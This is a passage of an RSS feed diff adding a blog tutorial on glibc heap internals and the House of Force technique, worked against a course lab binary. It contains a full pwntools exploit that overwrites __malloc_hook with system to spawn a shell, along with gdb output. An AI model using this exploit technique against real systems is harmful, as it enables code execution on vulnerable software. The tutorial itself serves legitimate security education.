@@ -9,10 +9,240 @@
     <description>Recent content in pwning on Adam Gold</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sat, 04 Jan 2020 21:28:48 +0300</lastBuildDate>
+    <lastBuildDate>Sat, 01 Aug 2020 17:47:42 +0300</lastBuildDate>
     
 	<atom:link href="https://adamgold.github.io/tags/pwning/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>Basic Heap Exploitation: House of Force</title>
+      <link>https://adamgold.github.io/posts/basic-heap-exploitation-house-of-force/</link>
+      <pubDate>Sat, 01 Aug 2020 17:47:42 +0300</pubDate>
+      
+      <guid>https://adamgold.github.io/posts/basic-heap-exploitation-house-of-force/</guid>
+      <description>
+        
+          
+          
+          
+        
+        
+        &lt;p&gt;I recently finished a Linux heap exploitation &lt;a href=&#34;https://www.udemy.com/course/linux-heap-exploitation-part-1/?referralCode=362370A773BCC3F2730A&#34;&gt;course&lt;/a&gt; (Referral link is instructor&amp;rsquo;s, not mine!), aimed to teach how the heap works and some popular exploitation techniques that are possible to execute once you are familiar with the heap&amp;rsquo;s metadata. In this short article, I will try to showcase some of the things that I have learned, with some examples.&lt;/p&gt;
+&lt;h2 id=&#34;learning-the-basics-of-the-heap&#34;&gt;Learning the Basics of the Heap&lt;/h2&gt;
+&lt;p&gt;Before diving into the exploitation details, you first need to understand what the heap is and its metadata structure.&lt;/p&gt;
+&lt;h3 id=&#34;what-is-the-heap&#34;&gt;What is the heap?&lt;/h3&gt;
+&lt;p&gt;The heap is the portion of memory where dynamically allocated memory resides. Dynamic memory allocating is used when a program does not know the size or number of objects in memory it needs prior to runtime (hence dynamic).
+Unlike the stack where memory is allocated and released in a very defined order, individual data elements allocated on the heap are typically released in ways which is asynchronous from one another.&lt;/p&gt;
+&lt;p&gt;Heap memory is essentially a large pool of memory (typically per process) from which the running program can request chunks during runtime. The heap is divided into &amp;ldquo;chunk&amp;rdquo; - large, contiguous blocks of memory requested from the kernel.&lt;/p&gt;
+&lt;p&gt;You may think that this is only relevant to low-level programming, for example the usage of &lt;code&gt;malloc&lt;/code&gt; in C (which will be covered later in this article) - But the heap is actually being used under the hood in many of the basic programming operations, even in high level languages such as Python or Ruby.&lt;/p&gt;
+&lt;p&gt;The heap is organized and implemented by a series of data structures, forming the heap metadata.&lt;/p&gt;
+&lt;div class=&#34;toast toast--blue add-margin&#34;&gt;
+	&lt;div class=&#34;toast__content&#34;&gt;
+		&lt;p class=&#34;toast__type&#34;&gt;Note&lt;/p&gt;
+		&lt;p class=&#34;toast__message&#34;&gt;
+			It&amp;rsquo;s important to note that throughout this post, only the GLIBC heap implementation will be discussed.
+		&lt;/p&gt;
+	&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&#34;heap-metadata&#34;&gt;Heap Metadata&lt;/h3&gt;
+&lt;p&gt;In order to see and understand how the heap is implemented, you will need to have an understanding of the &lt;code&gt;malloc&lt;/code&gt; function.&lt;/p&gt;
+&lt;p&gt;GLIBC&amp;rsquo;s &lt;code&gt;malloc&lt;/code&gt; function allows developers to request dynamic memory allocation. It takes a single argument - the size in bytes, and returns a pointer to that amount of memory.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As you can see, it&amp;rsquo;s very simple to use. This means that all of the &amp;ldquo;magic&amp;rdquo; happens under the hood - And what can be more exciting than unrevealing it?&lt;/p&gt;
+&lt;div class=&#34;toast toast--blue add-margin&#34;&gt;
+	&lt;div class=&#34;toast__content&#34;&gt;
+		&lt;p class=&#34;toast__type&#34;&gt;Note&lt;/p&gt;
+		&lt;p class=&#34;toast__message&#34;&gt;
+			If you wish to explore further, you can check out &lt;code&gt;malloc&lt;/code&gt;&#39;s &lt;a href=&#34;https://code.woboq.org/userspace/glibc/malloc/malloc.c.html&#34;&gt;source code&lt;/a&gt;.
+		&lt;/p&gt;
+	&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&#34;debugging-with-gdb&#34;&gt;Debugging with &lt;code&gt;gdb&lt;/code&gt;&lt;/h3&gt;
+&lt;p&gt;Suppose a programmer asks for, say, 16 bytes of memory. To service this request, the heap manager needs to do more than just find a random 16 byte region that the programmer can write to. The heap manager also needs to store metadata about the allocation. This metadata is stored alongside the 16-byte region that the programmer can use.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s hop onto &lt;code&gt;gdb&lt;/code&gt; to see how it plays out.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;In file: /home/adamgold/Documents/malloc_demo.c
+    5     char *e = malloc(16);
+    6
+    7     malloc(1);
+    8     malloc(0);
+    9
+   10     malloc(24);
+   11     malloc(25);
+   12
+ ► 13     return 0;
+   14 }
+
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The code above requests 5 chunk - with sizes of 16, 1, 0, 24 and 25. The breakpoint is set just after the request for the 25-bytes chunk. Using the &lt;code&gt;vis_heap_chunks&lt;/code&gt; (or &lt;code&gt;vis&lt;/code&gt;) command to display the heap, you can inspect the heap layout:&lt;/p&gt;
+
+&lt;figure &gt;
+    
+        &lt;img class=&#34;center&#34; src=&#34;https://adamgold.github.io/img/heap_visual.png&#34;
+             /&gt;
+        
+    
+&lt;/figure&gt;
+
+&lt;p&gt;Let&amp;rsquo;s break it down: We can see 7 different colors, although only 5 chunk requested. As mentioned before, metadata is stored inline - The heap does not store user data alone.&lt;/p&gt;
+&lt;p&gt;There are 4 parts that start with &lt;code&gt;0x0000000000000021&lt;/code&gt; followed by 24 bytes. The first 8 bytes are the size field - It&amp;rsquo;s where the size of each chunk is saved, along with some flags such as the &amp;ldquo;prev in use&amp;rdquo; flag. The following 24 bytes are the user data. You can see that 24 bytes have been assigned to all of the first 4 requests - Even though we requested for 16, 1, 0 and 24 respectively. This is because &lt;code&gt;malloc&lt;/code&gt; has a minimum chunk size of 24 bytes of user data - even when using &lt;code&gt;malloc(0)&lt;/code&gt;. So, the size is filled with &lt;code&gt;0x20&lt;/code&gt; (=32), which is 24 bytes of user data + 8 bytes of meta data.
+After that, you can see a size field of &lt;code&gt;0x31&lt;/code&gt;. This means that the size field increment in 8 each time - 40 bytes for &lt;code&gt;malloc(25)&lt;/code&gt;. This is why the least significant bit is not used (&lt;code&gt;0x20&lt;/code&gt;, &lt;code&gt;0x30&lt;/code&gt;, &lt;code&gt;0x40&lt;/code&gt;&amp;hellip;) and can be used for flags.&lt;/p&gt;
+&lt;p&gt;If you were wondering what the &amp;ldquo;prev in use&amp;rdquo; flag does - It&amp;rsquo;s there to mark if the previous chunk is freed or not. Chunks are in either of 2 mutually exclusive states: allocated or free. When a chunk is free, up to 5 quadwords of its user data are repurposed as metadata.&lt;/p&gt;
+&lt;p&gt;The last value - &lt;code&gt;0x0000000000020f51&lt;/code&gt; states the size of the &amp;ldquo;top chunk&amp;rdquo; - meaning the size of all the remaining memory in the heap.&lt;/p&gt;
+&lt;p&gt;This is where we&amp;rsquo;ll stop exploring the heap metadata for this post - But there is much more to learn, such as the types of freed chunks, unlinking vulnerabilities, and many more. The House of Force technique does not require this knowledge.&lt;/p&gt;
+&lt;h2 id=&#34;discovering-the-house-of-force-technique&#34;&gt;Discovering the House of Force Technique&lt;/h2&gt;
+&lt;p&gt;The House of Force technique is a simple one for achieving code execution on older binaries. It does not rely on complicated internal logics (such as House of Orange, for example) but it is a good start and, yeah, it&amp;rsquo;s pretty cool!&lt;/p&gt;
+&lt;h3 id=&#34;understanding-the-theory&#34;&gt;Understanding the theory&lt;/h3&gt;
+&lt;p&gt;In GLIBC versions &amp;lt; 2.29, top chunk size fields are not subject to any integrity checks during allocations. This means that you can write any value into it.&lt;/p&gt;
+&lt;p&gt;Basically, what you are going to be doing is to overflow a chunk in order to write a really large value into the &amp;ldquo;wilderness&amp;rdquo;, the top chunk. This will allow you to wrap around the virtual address space and then when you make another request, you&amp;rsquo;ll be able to get any address you want in memory. For example, you&amp;rsquo;ll be able to get addresses from the binary data section (which is in a lower address than the heap). Sounds complicated? Fear not! Let&amp;rsquo;s exploit an actual binary.&lt;/p&gt;
+&lt;h3 id=&#34;exploiting-a-binary-using-house-of-force&#34;&gt;Exploiting a binary using House of Force&lt;/h3&gt;
+&lt;p&gt;We are going to exploit a very simple binary, just to showcase the HOF technique. The binary is available after purchasing the course.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pwndbg&amp;gt; checksec
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/adamgold/Documents/courses/HeapLAB/house_of_force/house_of_force&amp;#39;&lt;/span&gt;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x400000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+    RUNPATH:  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;../.glibc/glibc_2.28_no-tcache&amp;#39;&lt;/span&gt;
+pwndbg&amp;gt; r
+Starting program: /home/adamgold/Documents/courses/HeapLAB/house_of_force/house_of_force
+
+&lt;span style=&#34;color:#f92672&#34;&gt;===============&lt;/span&gt;
+|   HeapLAB   |  House of Force
+&lt;span style=&#34;color:#f92672&#34;&gt;===============&lt;/span&gt;
+
+puts&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; @ 0x7ffff7a8ef10
+heap @ 0x603000
+
+1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; malloc 0/4
+2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; target
+3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; quit
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The binary leaks the address of libc &lt;code&gt;puts&lt;/code&gt; and the heap base address for simplicity. It is linked to GLIBC 2.28, so we can use the HOF technique.&lt;/p&gt;
+&lt;p&gt;After some time playing with the binary, it seems that there&amp;rsquo;s a heap overflow when using the malloc functionality. Here&amp;rsquo;s a quick proof of concept showing an override of the top chunk:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;house_of_force&amp;#34;&lt;/span&gt;)
+libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;libc
+
+io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; start()
+
+gs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;continue
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;start&lt;/span&gt;():
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GDB:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;debug(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path, gdbscript&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;gs)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; process(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path)
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Select the &amp;#34;malloc&amp;#34; option, send size &amp;amp; data.&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;malloc&lt;/span&gt;(size, data):
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;)
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;size: &amp;#34;&lt;/span&gt;, f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{size}&amp;#34;&lt;/span&gt;)
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;data: &amp;#34;&lt;/span&gt;, data)
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;)
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# This binary leaks the address of puts(), use it to resolve the libc load address.&lt;/span&gt;
+io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;puts() @ &amp;#34;&lt;/span&gt;)
+libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;puts
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# This binary leaks the heap start address.&lt;/span&gt;
+io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;heap @ &amp;#34;&lt;/span&gt;)
+heap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
+io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;)
+
+malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffffffffffff&lt;/span&gt;))
+
+io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pwndbg&amp;gt; vis
+
+0x603000	0x0000000000000000	0x0000000000000021	........!.......
+0x603010	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
+0x603020	0x5959595959595959	0xffffffffffffffff	YYYYYYYY........ &amp;lt;-- Top chunk
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;What&amp;rsquo;s left to do now is to get a shell by interrupting the program flow, easy right?&lt;/p&gt;
+&lt;p&gt;We can use &lt;code&gt;__malloc_hook&lt;/code&gt;, a function that is being called before &lt;code&gt;malloc&lt;/code&gt; - Overriding it with the &lt;code&gt;system&lt;/code&gt; address could give a shell!&lt;/p&gt;
+&lt;p&gt;The distance from the top chunk required to is &lt;code&gt;MALLOC_HOOK_ADDRESS - (HEAP_BASE + 0x20)&lt;/code&gt;. Notice the &lt;code&gt;0x20&lt;/code&gt; required to account for the already allocated chunk. We can add the following allocation:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;distance &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__malloc_hook &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; (heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;)
+malloc(distance, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And when running the script with gdb:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pwndbg&amp;gt; dq &amp;amp;__malloc_hook
+00007ffff7dd0c10     &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;
+00007ffff7dd0c20     &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; ffff8000088323f9
+00007ffff7dd0c30     &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;
+00007ffff7dd0c40     &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;
+pwndbg&amp;gt; top_chunk
+Top chunk
+Addr: 0x7ffff7dd0c20
+Size: 0xffff8000088323f9
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Great! Our &lt;code&gt;top_chunk&lt;/code&gt; is right at the start of &lt;code&gt;__malloc_hook&lt;/code&gt;. One more request will enable us to overwrite the hook.&lt;/p&gt;
+&lt;p&gt;But before we do that, &lt;code&gt;system&lt;/code&gt; will have to be called with &lt;code&gt;/bin/sh&lt;/code&gt;. We can insert &lt;code&gt;bin/sh&lt;/code&gt; right before the hook - as we know the address there. For that to work, we would need to overwrite &lt;code&gt;0x20&lt;/code&gt; bits before the hook, write &lt;code&gt;/bin/sh&lt;/code&gt;, and then make one more allocation request for the actual address overriding. Final exploit:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;house_of_force&amp;#34;&lt;/span&gt;)
+libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;libc
+
+io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; start()
+
+gs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;continue
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;start&lt;/span&gt;():
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GDB:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;debug(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path, gdbscript&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;gs)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; process(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path)
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Select the &amp;#34;malloc&amp;#34; option, send size &amp;amp; data.&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;malloc&lt;/span&gt;(size, data):
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;)
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;size: &amp;#34;&lt;/span&gt;, f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{size}&amp;#34;&lt;/span&gt;)
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;data: &amp;#34;&lt;/span&gt;, data)
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;)
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# This binary leaks the address of puts(), use it to resolve the libc load address.&lt;/span&gt;
+io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;puts() @ &amp;#34;&lt;/span&gt;)
+libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;puts
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# This binary leaks the heap start address.&lt;/span&gt;
+io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;heap @ &amp;#34;&lt;/span&gt;)
+heap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
+io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;)
+
+malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffffffffffff&lt;/span&gt;))
+distance &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__malloc_hook &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; (heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;)
+malloc(distance, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# start with /bin/sh and place the chunk right before malloc hook&lt;/span&gt;
+malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system)) &lt;span style=&#34;color:#75715e&#34;&gt;# overwrite malloc hook&lt;/span&gt;
+
+cmd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; heap &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# address to /bin/sh (parameter to malloc which is essentialy parameter to system)&lt;/span&gt;
+malloc(cmd, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
+
+io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And there&amp;rsquo;s our shell!&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adamgold@adamgold-VirtualBox:~/Documents/courses/HeapLAB/house_of_force$ python3 exp.py
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/adamgold/Documents/courses/HeapLAB/house_of_force/house_of_force&amp;#39;&lt;/span&gt;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
